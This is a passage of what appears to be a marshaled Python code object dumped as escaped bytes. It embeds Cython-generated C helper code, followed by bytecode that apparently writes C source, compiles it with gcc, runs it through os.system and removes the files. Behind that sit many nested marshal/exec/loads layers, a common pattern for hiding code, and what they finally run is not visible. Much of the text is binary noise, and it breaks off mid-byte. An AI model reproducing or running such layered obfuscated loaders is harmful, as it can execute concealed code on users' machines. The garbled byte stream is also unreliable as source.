(__Pyx_PyLong_IsCompact(x)) {\n                __PYX_VERIFY_RETURN_INT(int, __Pyx_compact_pylong, __Pyx_PyLong_CompactValue(x))\n            } else {\n                const digit* digits = __Pyx_PyLong_Digits(x);\n                assert(__Pyx_PyLong_DigitCount(x) > 1);\n                switch (__Pyx_PyLong_SignedDigitCount(x)) {\n                    case -2:\n                        if ((8 * sizeof(int) - 1 > 1 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                                return (int) (((int)-1)*(((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                            }\n                        }\n                        break;\n                    case 2:\n                        if ((8 * sizeof(int) > 1 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 2 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                                return (int) ((((((int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                            }\n                        }\n                        break;\n                    case -3:\n                        if ((8 * sizeof(int) - 1 > 2 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                                return (int) (((int)-1)*(((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                            }\n                        }\n                        break;\n                    case 3:\n                        if ((8 * sizeof(int) > 2 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 3 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                                return (int) ((((((((int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                            }\n                        }\n                        break;\n                    case -4:\n                        if ((8 * sizeof(int) - 1 > 3 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, long, -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {\n                                return (int) (((int)-1)*(((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                            }\n                        }\n                        break;\n                    case 4:\n                        if ((8 * sizeof(int) > 3 * PyLong_SHIFT)) {\n                            if ((8 * sizeof(unsigned long) > 4 * PyLong_SHIFT)) {\n                                __PYX_VERIFY_RETURN_INT(int, unsigned long, (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0])))\n                            } else if ((8 * sizeof(int) - 1 > 4 * PyLong_SHIFT)) {\n                                return (int) ((((((((((int)digits[3]) << PyLong_SHIFT) | (int)digits[2]) << PyLong_SHIFT) | (int)digits[1]) << PyLong_SHIFT) | (int)digits[0])));\n                            }\n                        }\n                        break;\n                }\n            }\n#endif\n            if ((sizeof(int) <= sizeof(long))) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, long, PyLong_AsLong(x))\n#ifdef HAVE_LONG_LONG\n            } else if ((sizeof(int) <= sizeof(PY_LONG_LONG))) {\n                __PYX_VERIFY_RETURN_INT_EXC(int, PY_LONG_LONG, PyLong_AsLongLong(x))\n#endif\n            }\n        }\n        {\n            int val;\n            PyObject *v = __Pyx_PyNumber_IntOrLong(x);\n#if PY_MAJOR_VERSION < 3\n            if (likely(v) && !PyLong_Check(v)) {\n                PyObject *tmp = v;\n                v = PyNumber_Long(tmp);\n                Py_DECREF(tmp);\n            }\n#endif\n            if (likely(v)) {\n                int ret = -1;\n#if !(CYTHON_COMPILING_IN_PYPY || CYTHON_COMPILING_IN_LIMITED_API) || defined(_PyLong_AsByteArray)\n                int one = 1; int is_little = (int)*(unsigned char *)&one;\n                unsigned char *bytes = (unsigned char *)&val;\n                ret = _PyLong_AsByteArray((PyLongObject *)v,\n                                           bytes, sizeof(val),\n                                           is_little, !is_unsigned);\n#else\n                PyObject *stepval = NULL, *mask = NULL, *shift = NULL;\n                int bits, remaining_bits, is_negative = 0;\n                long idigit;\n                int chunk_size = (sizeof(long) < 8) ? 30 : 62;\n                if (unlikely(!PyLong_CheckExact(v))) {\n                    PyObject *tmp = v;\n                    v = PyNumber_Long(v);\n                    assert(PyLong_CheckExact(v));\n                    Py_DECREF(tmp);\n                    if (unlikely(!v)) return (int) -1;\n                }\n#if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000\n                if (Py_SIZE(x) == 0)\n                    return (int) 0;\n                is_negative = Py_SIZE(x) < 0;\n#else\n                {\n                    int result = PyObject_RichCompareBool(x, Py_False, Py_LT);\n                    if (unlikely(result < 0))\n                        return (int) -1;\n                    is_negative = result == 1;\n                }\n#endif\n                if (is_unsigned && unlikely(is_negative)) {\n                    goto raise_neg_overflow;\n                } else if (is_negative) {\n                    stepval = PyNumber_Invert(v);\n                    if (unlikely(!stepval))\n                        return (int) -1;\n                } else {\n                    stepval = __Pyx_NewRef(v);\n                }\n                val = (int) 0;\n                mask = PyLong_FromLong((1L << chunk_size) - 1); if (unlikely(!mask)) goto done;\n                shift = PyLong_FromLong(chunk_size); if (unlikely(!shift)) goto done;\n                for (bits = 0; bits < (int) sizeof(int) * 8 - chunk_size; bits += chunk_size) {\n                    PyObject *tmp, *digit;\n                    digit = PyNumber_And(stepval, mask);\n                    if (unlikely(!digit)) goto done;\n                    idigit = PyLong_AsLong(digit);\n                    Py_DECREF(digit);\n                    if (unlikely(idigit < 0)) goto done;\n                    tmp = PyNumber_Rshift(stepval, shift);\n                    if (unlikely(!tmp)) goto done;\n                    Py_DECREF(stepval); stepval = tmp;\n                    val |= ((int) idigit) << bits;\n                    #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000\n                    if (Py_SIZE(stepval) == 0)\n                        goto unpacking_done;\n                    #endif\n                }\n                idigit = PyLong_AsLong(stepval);\n                if (unlikely(idigit < 0)) goto done;\n                remaining_bits = ((int) sizeof(int) * 8) - bits - (is_unsigned ? 0 : 1);\n                if (unlikely(idigit >= (1L << remaining_bits)))\n                    goto raise_overflow;\n                val |= ((int) idigit) << bits;\n            #if CYTHON_COMPILING_IN_LIMITED_API && PY_VERSION_HEX < 0x030B0000\n            unpacking_done:\n            #endif\n                if (!is_unsigned) {\n                    if (unlikely(val & (((int) 1) << (sizeof(int) * 8 - 1))))\n                        goto raise_overflow;\n                    if (is_negative)\n                        val = ~val;\n                }\n                ret = 0;\n            done:\n                Py_XDECREF(shift);\n                Py_XDECREF(mask);\n                Py_XDECREF(stepval);\n#endif\n                Py_DECREF(v);\n                if (likely(!ret))\n                    return val;\n            }\n            return (int) -1;\n        }\n    } else {\n        int val;\n        PyObject *tmp = __Pyx_PyNumber_IntOrLong(x);\n        if (!tmp) return (int) -1;\n        val = __Pyx_PyInt_As_int(tmp);\n        Py_DECREF(tmp);\n        return val;\n    }\nraise_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "value too large to convert to int");\n    return (int) -1;\nraise_neg_overflow:\n    PyErr_SetString(PyExc_OverflowError,\n        "can\'t convert negative value to int");\n    return (int) -1;\n}\n\n/* FastTypeChecks */\n#if CYTHON_COMPILING_IN_CPYTHON\nstatic int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {\n    while (a) {\n        a = __Pyx_PyType_GetSlot(a, tp_base, PyTypeObject*);\n        if (a == b)\n            return 1;\n    }\n    return b == &PyBaseObject_Type;\n}\nstatic CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (a == b) return 1;\n    mro = a->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(a, b);\n}\nstatic CYTHON_INLINE int __Pyx_IsAnySubtype2(PyTypeObject *cls, PyTypeObject *a, PyTypeObject *b) {\n    PyObject *mro;\n    if (cls == a || cls == b) return 1;\n    mro = cls->tp_mro;\n    if (likely(mro)) {\n        Py_ssize_t i, n;\n        n = PyTuple_GET_SIZE(mro);\n        for (i = 0; i < n; i++) {\n            PyObject *base = PyTuple_GET_ITEM(mro, i);\n            if (base == (PyObject *)a || base == (PyObject *)b)\n                return 1;\n        }\n        return 0;\n    }\n    return __Pyx_InBases(cls, a) || __Pyx_InBases(cls, b);\n}\n#if PY_MAJOR_VERSION == 2\nstatic int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {\n    PyObject *exception, *value, *tb;\n    int res;\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ErrFetch(&exception, &value, &tb);\n    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;\n    if (unlikely(res == -1)) {\n        PyErr_WriteUnraisable(err);\n        res = 0;\n    }\n    if (!res) {\n        res = PyObject_IsSubclass(err, exc_type2);\n        if (unlikely(res == -1)) {\n            PyErr_WriteUnraisable(err);\n            res = 0;\n        }\n    }\n    __Pyx_ErrRestore(exception, value, tb);\n    return res;\n}\n#else\nstatic CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {\n    if (exc_type1) {\n        return __Pyx_IsAnySubtype2((PyTypeObject*)err, (PyTypeObject*)exc_type1, (PyTypeObject*)exc_type2);\n    } else {\n        return __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);\n    }\n}\n#endif\nstatic int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {\n    Py_ssize_t i, n;\n    assert(PyExceptionClass_Check(exc_type));\n    n = PyTuple_GET_SIZE(tuple);\n#if PY_MAJOR_VERSION >= 3\n    for (i=0; i<n; i++) {\n        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;\n    }\n#endif\n    for (i=0; i<n; i++) {\n        PyObject *t = PyTuple_GET_ITEM(tuple, i);\n        #if PY_MAJOR_VERSION < 3\n        if (likely(exc_type == t)) return 1;\n        #endif\n        if (likely(PyExceptionClass_Check(t))) {\n            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;\n        } else {\n        }\n    }\n    return 0;\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {\n    if (likely(err == exc_type)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        if (likely(PyExceptionClass_Check(exc_type))) {\n            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);\n        } else if (likely(PyTuple_Check(exc_type))) {\n            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);\n        } else {\n        }\n    }\n    return PyErr_GivenExceptionMatches(err, exc_type);\n}\nstatic CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {\n    assert(PyExceptionClass_Check(exc_type1));\n    assert(PyExceptionClass_Check(exc_type2));\n    if (likely(err == exc_type1 || err == exc_type2)) return 1;\n    if (likely(PyExceptionClass_Check(err))) {\n        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);\n    }\n    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));\n}\n#endif\n\n/* CheckBinaryVersion */\nstatic unsigned long __Pyx_get_runtime_version() {\n#if __PYX_LIMITED_VERSION_HEX >= 0x030B00A4\n    return Py_Version & ~0xFFUL;\n#else\n    const char* rt_version = Py_GetVersion();\n    unsigned long version = 0;\n    unsigned long factor = 0x01000000UL;\n    unsigned int digit = 0;\n    int i = 0;\n    while (factor) {\n        while (\'0\' <= rt_version[i] && rt_version[i] <= \'9\') {\n            digit = digit * 10 + (unsigned int) (rt_version[i] - \'0\');\n            ++i;\n        }\n        version += factor * digit;\n        if (rt_version[i] != \'.\')\n            break;\n        digit = 0;\n        factor >>= 8;\n        ++i;\n    }\n    return version;\n#endif\n}\nstatic int __Pyx_check_binary_version(unsigned long ct_version, unsigned long rt_version, int allow_newer) {\n    const unsigned long MAJOR_MINOR = 0xFFFF0000UL;\n    if ((rt_version & MAJOR_MINOR) == (ct_version & MAJOR_MINOR))\n        return 0;\n    if (likely(allow_newer && (rt_version & MAJOR_MINOR) > (ct_version & MAJOR_MINOR)))\n        return 1;\n    {\n        char message[200];\n        PyOS_snprintf(message, sizeof(message),\n                      "compile time Python version %d.%d "\n                      "of module \'%.100s\' "\n                      "%s "\n                      "runtime version %d.%d",\n                       (int) (ct_version >> 24), (int) ((ct_version >> 16) & 0xFF),\n                       __Pyx_MODULE_NAME,\n                       (allow_newer) ? "was newer than" : "does not match",\n                       (int) (rt_version >> 24), (int) ((rt_version >> 16) & 0xFF)\n       );\n        return PyErr_WarnEx(NULL, message, 1);\n    }\n}\n\n/* InitStrings */\n#if PY_MAJOR_VERSION >= 3\nstatic int __Pyx_InitString(__Pyx_StringTabEntry t, PyObject **str) {\n    if (t.is_unicode | t.is_str) {\n        if (t.intern) {\n            *str = PyUnicode_InternFromString(t.s);\n        } else if (t.encoding) {\n            *str = PyUnicode_Decode(t.s, t.n - 1, t.encoding, NULL);\n        } else {\n            *str = PyUnicode_FromStringAndSize(t.s, t.n - 1);\n        }\n    } else {\n        *str = PyBytes_FromStringAndSize(t.s, t.n - 1);\n    }\n    if (!*str)\n        return -1;\n    if (PyObject_Hash(*str) == -1)\n        return -1;\n    return 0;\n}\n#endif\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry *t) {\n    while (t->p) {\n        #if PY_MAJOR_VERSION >= 3\n        __Pyx_InitString(*t, t->p);\n        #else\n        if (t->is_unicode) {\n            *t->p = PyUnicode_DecodeUTF8(t->s, t->n - 1, NULL);\n        } else if (t->intern) {\n            *t->p = PyString_InternFromString(t->s);\n        } else {\n            *t->p = PyString_FromStringAndSize(t->s, t->n - 1);\n        }\n        if (!*t->p)\n            return -1;\n        if (PyObject_Hash(*t->p) == -1)\n            return -1;\n        #endif\n        ++t;\n    }\n    return 0;\n}\n\n#include <string.h>\nstatic CYTHON_INLINE Py_ssize_t __Pyx_ssize_strlen(const char *s) {\n    size_t len = strlen(s);\n    if (unlikely(len > (size_t) PY_SSIZE_T_MAX)) {\n        PyErr_SetString(PyExc_OverflowError, "byte string is too long");\n        return -1;\n    }\n    return (Py_ssize_t) len;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char* c_str) {\n    Py_ssize_t len = __Pyx_ssize_strlen(c_str);\n    if (unlikely(len < 0)) return NULL;\n    return __Pyx_PyUnicode_FromStringAndSize(c_str, len);\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyByteArray_FromString(const char* c_str) {\n    Py_ssize_t len = __Pyx_ssize_strlen(c_str);\n    if (unlikely(len < 0)) return NULL;\n    return PyByteArray_FromStringAndSize(c_str, len);\n}\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject* o) {\n    Py_ssize_t ignore;\n    return __Pyx_PyObject_AsStringAndSize(o, &ignore);\n}\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n#if !CYTHON_PEP393_ENABLED\nstatic const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    char* defenc_c;\n    PyObject* defenc = _PyUnicode_AsDefaultEncodedString(o, NULL);\n    if (!defenc) return NULL;\n    defenc_c = PyBytes_AS_STRING(defenc);\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    {\n        char* end = defenc_c + PyBytes_GET_SIZE(defenc);\n        char* c;\n        for (c = defenc_c; c < end; c++) {\n            if ((unsigned char) (*c) >= 128) {\n                PyUnicode_AsASCIIString(o);\n                return NULL;\n            }\n        }\n    }\n#endif\n    *length = PyBytes_GET_SIZE(defenc);\n    return defenc_c;\n}\n#else\nstatic CYTHON_INLINE const char* __Pyx_PyUnicode_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n    if (unlikely(__Pyx_PyUnicode_READY(o) == -1)) return NULL;\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n    if (likely(PyUnicode_IS_ASCII(o))) {\n        *length = PyUnicode_GET_LENGTH(o);\n        return PyUnicode_AsUTF8(o);\n    } else {\n        PyUnicode_AsASCIIString(o);\n        return NULL;\n    }\n#else\n    return PyUnicode_AsUTF8AndSize(o, length);\n#endif\n}\n#endif\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n    if (\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n            __Pyx_sys_getdefaultencoding_not_ascii &&\n#endif\n            PyUnicode_Check(o)) {\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\n    } else\n#endif\n#if (!CYTHON_COMPILING_IN_PYPY && !CYTHON_COMPILING_IN_LIMITED_API) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))\n    if (PyByteArray_Check(o)) {\n        *length = PyByteArray_GET_SIZE(o);\n        return PyByteArray_AS_STRING(o);\n    } else\n#endif\n    {\n        char* result;\n        int r = PyBytes_AsStringAndSize(o, &result, length);\n        if (unlikely(r < 0)) {\n            return NULL;\n        } else {\n            return result;\n        }\n    }\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\n   int is_true = x == Py_True;\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\n   else return PyObject_IsTrue(x);\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\n    int retval;\n    if (unlikely(!x)) return -1;\n    retval = __Pyx_PyObject_IsTrue(x);\n    Py_DECREF(x);\n    return retval;\n}\nstatic PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {\n    __Pyx_TypeName result_type_name = __Pyx_PyType_GetName(Py_TYPE(result));\n#if PY_MAJOR_VERSION >= 3\n    if (PyLong_Check(result)) {\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                "__int__ returned non-int (type " __Pyx_FMT_TYPENAME ").  "\n                "The ability to return an instance of a strict subclass of int is deprecated, "\n                "and may be removed in a future version of Python.",\n                result_type_name)) {\n            __Pyx_DECREF_TypeName(result_type_name);\n            Py_DECREF(result);\n            return NULL;\n        }\n        __Pyx_DECREF_TypeName(result_type_name);\n        return result;\n    }\n#endif\n    PyErr_Format(PyExc_TypeError,\n                 "__%.4s__ returned non-%.4s (type " __Pyx_FMT_TYPENAME ")",\n                 type_name, type_name, result_type_name);\n    __Pyx_DECREF_TypeName(result_type_name);\n    Py_DECREF(result);\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {\n#if CYTHON_USE_TYPE_SLOTS\n  PyNumberMethods *m;\n#endif\n  const char *name = NULL;\n  PyObject *res = NULL;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_Check(x) || PyLong_Check(x)))\n#else\n  if (likely(PyLong_Check(x)))\n#endif\n    return __Pyx_NewRef(x);\n#if CYTHON_USE_TYPE_SLOTS\n  m = Py_TYPE(x)->tp_as_number;\n  #if PY_MAJOR_VERSION < 3\n  if (m && m->nb_int) {\n    name = "int";\n    res = m->nb_int(x);\n  }\n  else if (m && m->nb_long) {\n    name = "long";\n    res = m->nb_long(x);\n  }\n  #else\n  if (likely(m && m->nb_int)) {\n    name = "int";\n    res = m->nb_int(x);\n  }\n  #endif\n#else\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\n    res = PyNumber_Int(x);\n  }\n#endif\n  if (likely(res)) {\n#if PY_MAJOR_VERSION < 3\n    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {\n#else\n    if (unlikely(!PyLong_CheckExact(res))) {\n#endif\n        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);\n    }\n  }\n  else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_TypeError,\n                    "an integer is required");\n  }\n  return res;\n}\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {\n  Py_ssize_t ival;\n  PyObject *x;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_CheckExact(b))) {\n    if (sizeof(Py_ssize_t) >= sizeof(long))\n        return PyInt_AS_LONG(b);\n    else\n        return PyInt_AsSsize_t(b);\n  }\n#endif\n  if (likely(PyLong_CheckExact(b))) {\n    #if CYTHON_USE_PYLONG_INTERNALS\n    if (likely(__Pyx_PyLong_IsCompact(b))) {\n        return __Pyx_PyLong_CompactValue(b);\n    } else {\n      const digit* digits = __Pyx_PyLong_Digits(b);\n      const Py_ssize_t size = __Pyx_PyLong_SignedDigitCount(b);\n      switch (size) {\n         case 2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n      }\n    }\n    #endif\n    return PyLong_AsSsize_t(b);\n  }\n  x = PyNumber_Index(b);\n  if (!x) return -1;\n  ival = PyInt_AsSsize_t(x);\n  Py_DECREF(x);\n  return ival;\n}\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\n#if PY_MAJOR_VERSION < 3\n  } else if (likely(PyInt_CheckExact(o))) {\n    return PyInt_AS_LONG(o);\n#endif\n  } else {\n    Py_ssize_t ival;\n    PyObject *x;\n    x = PyNumber_Index(o);\n    if (!x) return -1;\n    ival = PyInt_AsLong(x);\n    Py_DECREF(x);\n    return ival;\n  }\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {\n    return PyInt_FromSize_t(ival);\n}\n\n\n/* #### Code section: utility_code_pragmas_end ### */\n#ifdef _MSC_VER\n#pragma warning( pop )\n#endif\n\n\n\n/* #### Code section: end ### */\n#endif /* Py_PYTHON_H */z\r.py_private.c\xda\x01.\xfa\x01 \xe9\xff\xff\xff\xffz\x06gcc -Iz\x0f/include/pythonz\x04 -o z\x03 -Lz\r/lib -lpython\xda\x01wT)\x01\xda\x08exist_ok)\x1cZ\x03fooZ\x03bar\xda\x02os\xda\x03sysZ\x0cEXECUTE_FILE\xda\x06prefixZ\x06PREFIXZ\x11EXPORT_PYTHONHOME\xda\nexecutableZ\x18EXPORT_PYTHON_EXECUTABLEZ\x03RUN\xda\x04path\xda\x06isfile\xda\x06system\xda\x04exitZ\x08C_SOURCEZ\x06C_FILE\xda\x04join\xda\x07version\xda\x05splitZ\x0ePYTHON_VERSIONZ\x0cCOMPILE_FILE\xda\x04open\xda\x01f\xda\x05write\xda\x08makedirs\xda\x07dirname\xda\x06remove\xa9\x00r\x1a\x00\x00\x00r\x1a\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\xee\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01\x08\x02\x04\x01\x06\x01\x08\x01\n\x02\x08\x02\x0c\x01\n\x01\x1a\x01\x08\x02\x04\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x00\x7f\x008\x04\x01$\x02\x02\x01\x02\xff\x02\x02\x02\xfe\x02\x03\x02\xfd\x02\x04\x02\xfc\x02\x05\x02\xfb\x02\x06\x02\xfa\x02\x07\x02\xf9\x02\x08\x02\xf8\x02\t\x02\xf7\x02\n\x02\xf6\x02\x0b\x02\xf5\x02\xff\x02\x10\x0c\x01*\x02\x16\x01"\x02\n\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x07marshal\xda\x04exec\xda\x05loads\xa9\x00r\x06\x00\x00\x00r\x06\x00\x00\x00\xda\x00\xda\x08<module>\x01\x00\x00\x00s\x08\x00\x00\x00\x04\x01\x04\x01\x08\x01\x08\x01)\x05Z\x03fooZ\x03bar\xda\x